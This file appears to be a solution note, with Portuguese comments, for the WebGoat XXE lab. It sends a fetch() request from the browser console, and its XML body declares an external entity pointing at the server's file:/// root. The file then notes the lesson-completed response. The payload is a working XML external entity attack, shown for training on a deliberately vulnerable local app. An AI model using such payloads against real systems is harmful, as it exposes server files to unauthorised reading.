// WebGoat - XXE (XML External Entity)
// OWASP: A05 - Security Misconfiguration (parser XML aceita entidades externas
//         por configuracao padrao insegura)
// CWE-611

// ---------------------------------------------------------------------------
// Requisicao original observada (comentario normal, sem ataque):
// POST http://127.0.0.1:8080/WebGoat/xxe/simple
// Content-Type: application/xml
// Body: <?xml version="1.0"?><comment><text>cer</text></comment>
// ---------------------------------------------------------------------------

// Payload malicioso: injeta um DOCTYPE com uma entidade externa apontando
// para a raiz do sistema de arquivos do servidor (file:///), referenciada
// dentro do elemento <text>. Executar no Console do DevTools (F12):

fetch("http://127.0.0.1:8080/WebGoat/xxe/simple", {
  headers: {
    "accept": "*/*",
    "content-type": "application/xml",
    "x-requested-with": "XMLHttpRequest"
  },
  referrer: "http://127.0.0.1:8080/WebGoat/start.mvc?username=heisedev",
  body: '<?xml version="1.0"?><!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;</text></comment>',
  method: "POST",
  mode: "cors",
  credentials: "include"
}).then(r => r.text()).then(console.log).catch(console.error)

// Resultado esperado: lessonCompleted: true, feedback:
// "Congratulations. You have successfully completed the assignment."
// O parser processou a entidade externa, confirmando que o servidor aceita
// DOCTYPE/entidades externas em XML recebido do cliente (configuracao insegura).
